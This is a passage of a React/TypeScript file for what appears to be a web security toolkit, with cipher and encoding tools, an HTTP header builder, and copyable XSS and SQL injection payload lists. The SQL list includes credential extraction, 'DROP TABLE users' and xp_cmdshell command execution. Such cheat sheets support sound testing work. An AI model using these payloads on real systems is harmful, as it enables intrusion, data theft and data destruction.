        <ToolButton onClick={process} disabled={!input.trim()}><Lock className="h-4 w-4" /> Process</ToolButton>
      </div>
      {output && (
        <>
          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}

// === Vigenere Cipher ===
export function VigenereCipher() {
  const [input, setInput] = useState('');
  const [key, setKey] = useState('');
  const [mode, setMode] = useState<'encrypt' | 'decrypt'>('encrypt');
  const [output, setOutput] = useState('');

  const process = () => {
    const cleanKey = key.replace(/[^a-zA-Z]/g, '').toUpperCase();
    if (!cleanKey) return;
    let keyIndex = 0;
    const result = [...input].map((char) => {
      const code = char.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        const shift = cleanKey.charCodeAt(keyIndex % cleanKey.length) - 65;
        const shifted = mode === 'encrypt' ? (code - 65 + shift) % 26 : (code - 65 - shift + 26) % 26;
        keyIndex++;
        return String.fromCharCode(shifted + 65);
      }
      if (code >= 97 && code <= 122) {
        const shift = cleanKey.charCodeAt(keyIndex % cleanKey.length) - 65;
        const shifted = mode === 'encrypt' ? (code - 97 + shift) % 26 : (code - 97 - shift + 26) % 26;
        keyIndex++;
        return String.fromCharCode(shifted + 97);
      }
      return char;
    }).join('');
    setOutput(result);
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text..." rows={4} />
      <div className="flex items-end gap-4">
        <div className="flex gap-2">
          <button onClick={() => setMode('encrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'encrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Encrypt</button>
          <button onClick={() => setMode('decrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'decrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Decrypt</button>
        </div>
        <div className="flex-1">
          <label className="block text-xs text-slate-400 mb-1">Keyword</label>
          <input type="text" value={key} onChange={(e) => setKey(e.target.value)} placeholder="SECRET" className="w-full rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
        </div>
        <ToolButton onClick={process} disabled={!input.trim() || !key.trim()}>Process</ToolButton>
      </div>
      {output && (
        <>
          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}

// === ROT13 ===
export function ROT13Converter() {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');

  const convert = () => {
    setOutput([...input].map((char) => {
      const code = char.charCodeAt(0);
      if (code >= 65 && code <= 77) return String.fromCharCode(code + 13);
      if (code >= 78 && code <= 90) return String.fromCharCode(code - 13);
      if (code >= 97 && code <= 109) return String.fromCharCode(code + 13);
      if (code >= 110 && code <= 122) return String.fromCharCode(code - 13);
      return char;
    }).join(''));
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text to ROT13..." rows={4} />
      <ToolButton onClick={convert} disabled={!input.trim()}>ROT13</ToolButton>
      {output && (
        <>
          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}

// === Base32 Encode/Decode ===
const BASE32_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

export function Base32Encode() {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');

  const encode = () => {
    const bytes = new TextEncoder().encode(input);
    let bits = 0, value = 0, result = '';
    for (const byte of bytes) {
      value = (value << 8) | byte;
      bits += 8;
      while (bits >= 5) {
        result += BASE32_CHARS[(value >>> (bits - 5)) & 31];
        bits -= 5;
      }
    }
    if (bits > 0) result += BASE32_CHARS[(value << (5 - bits)) & 31];
    while (result.length % 8 !== 0) result += '=';
    setOutput(result);
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Text to Encode" value={input} onChange={setInput} placeholder="Enter text..." rows={4} />
      <ToolButton onClick={encode} disabled={!input.trim()}>Encode to Base32</ToolButton>
      {output && (<><ToolInput label="Base32 Output" value={output} onChange={() => {}} rows={4} readOnly mono /><CopyButton text={output} /></>)}
    </div>
  );
}

export function Base32Decode() {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [error, setError] = useState('');

  const decode = () => {
    try {
      const cleaned = input.trim().toUpperCase().replace(/=+$/, '');
      if (!/^[A-Z2-7]+$/.test(cleaned)) { setError('Invalid Base32 input.'); setOutput(''); return; }
      let bits = 0, value = 0;
      const bytes: number[] = [];
      for (const char of cleaned) {
        const idx = BASE32_CHARS.indexOf(char);
        value = (value << 5) | idx;
        bits += 5;
        if (bits >= 8) {
          bytes.push((value >>> (bits - 8)) & 255);
          bits -= 8;
        }
      }
      setOutput(new TextDecoder().decode(new Uint8Array(bytes)));
      setError('');
    } catch { setError('Could not decode as Base32.'); }
  };

  return (
    <div className="space-y-6">
      <ToolInput label="Base32 Text" value={input} onChange={setInput} placeholder="JBSWY3DPEBLW64TMMQ====" rows={4} mono />
      <ToolButton onClick={decode} disabled={!input.trim()}>Decode from Base32</ToolButton>
      {error && <ToolError message={error} />}
      {output && (<><ToolInput label="Decoded Text" value={output} onChange={() => {}} rows={4} readOnly /><CopyButton text={output} /></>)}
    </div>
  );
}

// === XSS Payload Reference ===
const XSS_PAYLOADS: { payload: string; type: string; description: string }[] = [
  { payload: '<script>alert(1)</script>', type: 'Classic', description: 'Basic script execution' },
  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror event in img tag' },
  { payload: '<svg onload=alert(1)>', type: 'Event Handler', description: 'onload in SVG element' },
  { payload: '<body onload=alert(1)>', type: 'Event Handler', description: 'onload in body tag' },
  { payload: '"><script>alert(1)</script>', type: 'Breakout', description: 'Break out of attribute' },
  { payload: "'-alert(1)-'", type: 'Breakout', description: 'Break out of JS string' },
  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe', description: 'JavaScript URI in iframe' },
  { payload: '<a href="javascript:alert(1)">click</a>', type: 'URI', description: 'JavaScript URI in anchor' },
  { payload: '<input onfocus=alert(1) autofocus>', type: 'Event Handler', description: 'Autofocus + onfocus' },
  { payload: '<details open ontoggle=alert(1)>', type: 'Event Handler', description: 'ontoggle in details' },
  { payload: '<marquee onstart=alert(1)>', type: 'Event Handler', description: 'onstart in marquee' },
  { payload: '<video src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror in video' },
  { payload: 'javascript:alert(1)', type: 'URI', description: 'JavaScript protocol' },
  { payload: 'data:text/html,<script>alert(1)</script>', type: 'Data URI', description: 'Data URI with script' },
  { payload: '<embed src="javascript:alert(1)">', type: 'Embed', description: 'JavaScript in embed' },
  { payload: '<object data="javascript:alert(1)">', type: 'Object', description: 'JavaScript in object' },
  { payload: '<form><button formaction=javascript:alert(1)>X</button>', type: 'Form', description: 'formaction with JS URI' },
  { payload: '<meta http-equiv=refresh content="0;javascript:alert(1)">', type: 'Meta', description: 'Meta refresh with JS' },
  { payload: '<base href="javascript:alert(1)//">', type: 'Base', description: 'Base tag hijacking' },
  { payload: '<textarea><script>alert(1)</script></textarea>', type: 'Nested', description: 'Script inside textarea' },
  { payload: '<style>@import url(javascript:alert(1))</style>', type: 'Style', description: 'CSS import with JS' },
  { payload: '<link rel=stylesheet href="javascript:alert(1)">', type: 'Link', description: 'JS in link stylesheet' },
  { payload: '<script src=data:text/javascript,alert(1)></script>', type: 'Data URI', description: 'External script via data URI' },
  { payload: '<xmp><script>alert(1)</script></xmp>', type: 'Deprecated', description: 'XMP tag bypass' },
  { payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', type: 'Bypass', description: 'noscript context bypass' },
];

export function XSSPayloadReference() {
  const [search, setSearch] = useState('');
  const [copied, setCopied] = useState<number | null>(null);
  const filtered = XSS_PAYLOADS.filter((p) =>
    p.payload.toLowerCase().includes(search.toLowerCase()) ||
    p.type.toLowerCase().includes(search.toLowerCase()) ||
    p.description.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Search className="h-4 w-4 text-slate-500" />
        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
      </div>
      <div className="space-y-2 max-h-96 overflow-y-auto">
        {filtered.map((p, i) => (
          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
            <div className="flex items-center gap-3 mb-1">
              <span className="px-2 py-0.5 rounded text-xs font-medium bg-cyan-500/20 text-cyan-400">{p.type}</span>
              <span className="text-xs text-slate-500">{p.description}</span>
              <button
                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
              >
                {copied === i ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
          </div>
        ))}
      </div>
      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
    </div>
  );
}

// === SQL Injection Payload Reference ===
const SQLI_PAYLOADS: { payload: string; type: string; description: string }[] = [
  { payload: "'", type: 'Detection', description: 'Single quote - test for string injection' },
  { payload: '"', type: 'Detection', description: 'Double quote - test for string injection' },
  { payload: "' OR '1'='1", type: 'Auth Bypass', description: 'Classic authentication bypass' },
  { payload: "' OR '1'='1' --", type: 'Auth Bypass', description: 'Bypass with comment' },
  { payload: "' OR '1'='1' /*", type: 'Auth Bypass', description: 'Bypass with block comment' },
  { payload: "admin'--", type: 'Auth Bypass', description: 'Bypass login as admin' },
  { payload: "' UNION SELECT NULL--", type: 'UNION', description: 'UNION with NULL to find column count' },
  { payload: "' UNION SELECT NULL,NULL--", type: 'UNION', description: 'UNION with 2 columns' },
  { payload: "' UNION SELECT NULL,NULL,NULL--", type: 'UNION', description: 'UNION with 3 columns' },
  { payload: "' UNION SELECT username,password FROM users--", type: 'UNION', description: 'Extract credentials' },
  { payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", type: 'Info Schema', description: 'Enumerate table names' },
  { payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", type: 'Info Schema', description: 'Enumerate columns' },
  { payload: "' AND SLEEP(5)--", type: 'Time-based', description: 'Time-based blind (MySQL)' },
  { payload: "' AND 1=CONVERT(int, (SELECT @@version))--", type: 'Error-based', description: 'Error-based (MSSQL)' },
  { payload: "' WAITFOR DELAY '0:0:5'--", type: 'Time-based', description: 'Time-based blind (MSSQL)' },
  { payload: "1; DROP TABLE users--", type: 'Stacked', description: 'Stacked query (MSSQL/PostgreSQL)' },
  { payload: "' OR 1=1 LIMIT 1--", type: 'Auth Bypass', description: 'Bypass with LIMIT (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,version()--", type: 'Version', description: 'Get database version (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,database()--", type: 'Database', description: 'Get current database (MySQL)' },
  { payload: "' UNION ALL SELECT NULL,user()--", type: 'User', description: 'Get current user (MySQL)' },
  { payload: "'; EXEC xp_cmdshell('dir')--", type: 'OS Command', description: 'OS command via xp_cmdshell (MSSQL)' },
  { payload: "' AND (SELECT SUBSTRING(version(),1,1))='5'--", type: 'Boolean Blind', description: 'Boolean-based blind extraction' },
  { payload: "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", type: 'Boolean Blind', description: 'Test if admin user exists' },
  { payload: "1 UNION SELECT CAST(table_name AS INT) FROM information_schema.tables--", type: 'Error-based', description: 'Error-based enumeration (PostgreSQL)' },
  { payload: "' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", type: 'Info Schema', description: 'Group concat all tables (MySQL)' },
];

export function SQLiPayloadReference() {
  const [search, setSearch] = useState('');
  const [copied, setCopied] = useState<number | null>(null);
  const filtered = SQLI_PAYLOADS.filter((p) =>
    p.payload.toLowerCase().includes(search.toLowerCase()) ||
    p.type.toLowerCase().includes(search.toLowerCase()) ||
    p.description.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Search className="h-4 w-4 text-slate-500" />
        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
      </div>
      <div className="space-y-2 max-h-96 overflow-y-auto">
        {filtered.map((p, i) => (
          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
            <div className="flex items-center gap-3 mb-1">
              <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400">{p.type}</span>
              <span className="text-xs text-slate-500">{p.description}</span>
              <button
                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
              >
                {copied === i ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
          </div>
        ))}
      </div>
      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
    </div>
  );
}

// === HTTP Header Injector ===
export function HTTPHeaderInjector() {
  const [headers, setHeaders] = useState([{ key: '', value: '' }]);
  const [output, setOutput] = useState('');

  const addRow = () => setHeaders([...headers, { key: '', value: '' }]);
  const removeRow = (i: number) => setHeaders(headers.filter((_, idx) => idx !== i));
  const update = (i: number, field: 'key' | 'value', val: string) => {
    setHeaders(headers.map((h, idx) => idx === i ? { ...h, [field]: val } : h));
  };

  const generate = () => {
    const valid = headers.filter((h) => h.key.trim());
    const lines = valid.map((h) => `${h.key.trim()}: ${h.value.trim()}`);
    setOutput(lines.join('\n'));
  };

  const generateCurl = () => {
    const valid = headers.filter((h) => h.key.trim());
    const flags = valid.map((h) => `-H '${h.key.trim()}: ${h.value.trim()}'`).join(' \\\n  ');
    setOutput(`curl ${flags} \\\n  https://example.com`);
  };

  return (
    <div className="space-y-6">
      <div className="space-y-3">
        {headers.map((h, i) => (
          <div key={i} className="flex gap-3">
            <input type="text" value={h.key} onChange={(e) => update(i, 'key', e.target.value)} placeholder="Header name (e.g. Authorization)"
              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
            <input type="text" value={h.value} onChange={(e) => update(i, 'value', e.target.value)} placeholder="Header value (e.g. Bearer token123)"
              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
            <button onClick={() => removeRow(i)} className="px-3 rounded-lg bg-rose-500/20 text-rose-400 hover:bg-rose-500/30 text-sm">Remove</button>
          </div>
        ))}
      </div>
      <div className="flex gap-3">
        <button onClick={addRow} className="px-4 py-2 rounded-lg bg-slate-700 text-slate-300 hover:bg-slate-600 text-sm font-medium">Add Header</button>
        <ToolButton onClick={generate}>Generate Raw</ToolButton>
        <ToolButton onClick={generateCurl} variant="secondary">Generate cURL</ToolButton>
      </div>
      {output && (
        <>
          <ToolInput label="Output" value={output} onChange={() => {}} rows={8} readOnly mono />
          <CopyButton text={output} />
        </>
      )}
    </div>
  );
}
